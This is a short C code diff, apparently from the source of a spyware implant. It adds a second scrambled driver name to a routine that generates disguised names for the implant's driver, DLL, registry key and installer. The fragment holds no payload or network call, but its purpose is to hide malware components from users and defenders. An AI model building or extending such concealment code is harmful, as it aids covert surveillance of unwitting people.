@@ -83,6 +83,7 @@ char H4_MOBCORE_NAME[MAX_RAND_NAME];
 char H4_MOBZOO_NAME[MAX_RAND_NAME];
 char H64DLL_NAME[MAX_RAND_NAME];
 char H4DRIVER_NAME[MAX_RAND_NAME];
+char H4DRIVER_NAME_ALT[MAX_RAND_NAME];
 char H4_UPDATE_FILE[MAX_RAND_NAME];
 char REGISTRY_KEY_NAME[MAX_RAND_NAME];
 char EXE_INSTALLER_NAME[MAX_RAND_NAME];
@@ -1507,11 +1508,23 @@ BOOL HM_GuessNames()
 			return FALSE;
 		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
+
+		if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) )
+			return FALSE;
+		_snprintf_s(H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		SAFE_FREE(ptr_offset);
+
 	} else {
 		if ( !(ptr_offset = LOG_ScrambleName(H4_DUMMY_NAME, 1, TRUE)) )
 			return FALSE;
 		_snprintf_s(H4DRIVER_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
 		SAFE_FREE(ptr_offset);
+		
+		if ( !(ptr_offset = LOG_ScrambleName(H64DLL_NAME, 1, TRUE)) )
+			return FALSE;
+		_snprintf_s(H4DRIVER_NAME_ALT, MAX_RAND_NAME, _TRUNCATE, "%s", ptr_offset);
+		SAFE_FREE(ptr_offset);
+
 	}
 
 	// XXX Attenzione che i successivi li devo derivare da H4_MOBZOO_NAME scramblato di 2
